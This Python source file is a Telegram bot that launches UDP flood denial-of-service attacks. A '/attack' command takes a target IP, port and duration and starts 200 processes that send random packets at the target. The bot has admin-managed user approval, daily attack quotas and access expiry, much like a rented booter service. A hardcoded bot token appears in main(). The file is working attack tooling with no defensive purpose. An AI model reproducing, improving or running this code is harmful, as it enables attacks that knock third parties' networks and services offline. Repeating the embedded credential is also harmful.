import json
import socket
import random
import time
from datetime import datetime, timedelta
import requests
from multiprocessing import Process
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Global variables
attack_running = False
approved_users = []
user_attack_counts = {}

DEFAULT_MAX_ATTACKS = 40
OWNER_MAX_ATTACKS = float('inf')
DEFAULT_PROCESSES = 200
MAX_DURATION = 400

DATA_FILE = "user_data.json"
ADMIN_USER = "alongbarbasumatary"

def load_data():
    global approved_users, user_attack_counts
    try:
        with open(DATA_FILE, "r") as file:
            data = json.load(file)
            approved_users = data.get("approved_users", [])
            user_attack_counts = data.get("user_attack_counts", {})
    except FileNotFoundError:
        approved_users = []
        user_attack_counts = {}

def save_data():
    with open(DATA_FILE, "w") as file:
        data = {
            "approved_users": approved_users,
            "user_attack_counts": user_attack_counts
        }
        json.dump(data, file)

def get_isp():
    try:
        response = requests.get("http://ipinfo.io")
        data = response.json()
        return data.get("org", "Unknown ISP")
    except Exception as e:
        print(f"Error fetching ISP information: {e}")
        return "Unknown ISP"

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration

    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
        except Exception as e:
            print(f"Error sending packet: {e}")
            break

async def start_attack(target_ip, target_port, duration, update: Update, context: ContextTypes.DEFAULT_TYPE, max_attacks):
    global attack_running
    attack_running = True

    isp = get_isp()

    await update.message.reply_text("🚀 Attack has been initiated 🚀")
    await update.message.reply_text(f"IP     : {target_ip}")
    await update.message.reply_text(f"PORT   : {target_port}")
    await update.message.reply_text(f"ISP    : {isp}")
    await update.message.reply_text(f"Second : {duration}")

    process_list = []

    for i in range(DEFAULT_PROCESSES):
        process = Process(target=udp_flood, args=(target_ip, target_port, duration), name=f"Process-{i+1}")
        process_list.append(process)
        process.start()

    for process in process_list:
        process.join()

    attack_running = False
    await update.message.reply_text("🚀ATTACK SUCCESSFULLY COMPLETED🚀")

def check_user_limits(username):
    today_str = datetime.now().strftime("%Y-%m-%d")
    if username not in user_attack_counts:
        user_attack_counts[username] = {"count": 0, "date": today_str}
    else:
        user_data = user_attack_counts[username]
        if user_data["date"] != today_str:
            user_data["count"] = 0
            user_data["date"] = today_str

def is_user_expired(user):
    added_at = datetime.strptime(user["added_at"], "%Y-%m-%d %H:%M:%S")
    expires_in = timedelta(seconds=user["expires_in"])
    return datetime.now() > (added_at + expires_in)

def remove_expired_users():
    global approved_users
    approved_users = [user for user in approved_users if not is_user_expired(user)]
    save_data()

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    try:
        if attack_running:
            await update.message.reply_text("Please wait, another attack is running.")
            return

        username = update.message.from_user.username

        remove_expired_users()  # Remove expired users before checking

        if username == ADMIN_USER:
            max_attacks = OWNER_MAX_ATTACKS
        else:
            for user in approved_users:
                if user["username"] == username:
                    if is_user_expired(user):
                        await update.message.reply_text("Your access has expired.")
                        return
                    max_attacks = user["max_attacks"]
                    break
            else:
                await update.message.reply_text("⚠️You are not authorized to use this command⚠️")
                return

        check_user_limits(username)
        user_data = user_attack_counts[username]

        if user_data["count"] >= max_attacks:
            await update.message.reply_text("⚠️You have reached your maximum limit for attacks today.⚠️")
            return

        if len(context.args) < 3:
            await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
            return
        
        target_ip = context.args[0]
        target_port = int(context.args[1])
        duration = int(context.args[2])

        if duration > MAX_DURATION:
            await update.message.reply_text(f"Duration cannot be more than {MAX_DURATION // 60} minutes.")
            return

        user_data["count"] += 1
        save_data()  # Save data after each attack

        await start_attack(target_ip, target_port, duration, update, context, max_attacks)
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        attack_running = False

async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.username != ADMIN_USER:
            await update.message.reply_text("⚠️You are not authorized to use this command.⚠️")
            return

        if len(context.args) < 3:
            await update.message.reply_text("Usage: /adduser <username> <max_attacks> <expires_in_seconds>")
            return

        new_user = context.args[0]
        max_attacks = int(context.args[1])
        expires_in = int(context.args[2])
        added_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        for user in approved_users:
            if user["username"] == new_user:
                await update.message.reply_text(f"{new_user} is already an approved user 👤")
                return

        approved_users.append({"username": new_user, "max_attacks": max_attacks, "expires_in": expires_in, "added_at": added_at})
        save_data()  # Save data after adding a user

        await update.message.reply_text(f"{new_user} has been added as an approved user with max {max_attacks} attacks and expires in {expires_in} seconds.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def list_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.username != ADMIN_USER:
            await update.message.reply_text("⚠️You are not authorized to use this command⚠️")
            return

        remove_expired_users()  # Remove expired users before listing

        if not approved_users:
            await update.message.reply_text("No users have been added yet 📝")
            return

        users_list = "\n".join([f"👤 {user['username']} - Max Attacks: {user['max_attacks']}, Expires In: {user['expires_in']} seconds, Added At: {user['added_at']}" for user in approved_users])
        await update.message.reply_text(f"List of approved users:\n{users_list}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message.from_user.username != ADMIN_USER:
            await update.message.reply_text("⚠️You are not authorized to use this command⚠️")
            return

        if len(context.args) < 1:
            await update.message.reply_text("Usage: /removeuser <username>")
            return

        user_to_remove = context.args[0]

        if user_to_remove == ADMIN_USER:
            await update.message.reply_text("⚠️Admin user cannot be removed⚠️")
            return

        for user in approved_users:
            if user["username"] == user_to_remove:
                approved_users.remove(user)
                if user_to_remove in user_attack_counts:
                    del user_attack_counts[user_to_remove]
                save_data()  # Save data after removing a user
                await update.message.reply_text(f"{user_to_remove} has been removed from the approved users.")
                return

        await update.message.reply_text(f"{user_to_remove} is not an approved user.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

def main():
    load_data()  # Load data when the script starts

    application = Application.builder().token("6852798423:AAGwqbAcVL8eD2Cwdu2vZxTvvVYT334GPBg").build()

    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("adduser", add_user_command))
    application.add_handler(CommandHandler("listusers", list_users_command))
    application.add_handler(CommandHandler("removeuser", remove_user_command))

    application.run_polling()

if __name__ == "__main__":
    main()
